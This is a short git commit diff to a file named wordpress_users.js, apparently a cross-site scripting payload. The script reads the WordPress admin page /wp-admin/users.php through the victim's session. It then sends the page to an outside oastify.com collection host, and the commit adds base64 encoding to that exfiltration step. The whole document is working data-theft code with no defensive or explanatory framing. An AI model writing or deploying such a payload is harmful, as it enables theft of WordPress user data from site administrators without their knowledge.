e12197ddf512cee13080641f80248b355e37007f
gandhi3 <81832437@qq.com>
2023-07-11 23:06:15 +0800

    test

--- wordpress_users.js
+++ wordpress_users.js
@@ -3,8 +3,9 @@ var req = new XMLHttpRequest();
 req.open("GET", "/wp-admin/users.php", false);
 req.send();
 var res = req.responseText;
+var res_base64 = self.btoa(res);
 
 var req2 = new XMLHttpRequest();
 
-req2.open("GET", "https://gvfjffl7k87xqysjjj6tkgnn4ea5yvmk.oastify.com/?res="+ res, true);
+req2.open("GET", "https://gvfjffl7k87xqysjjj6tkgnn4ea5yvmk.oastify.com/?res="+ res_base64, true);
 req2.send();
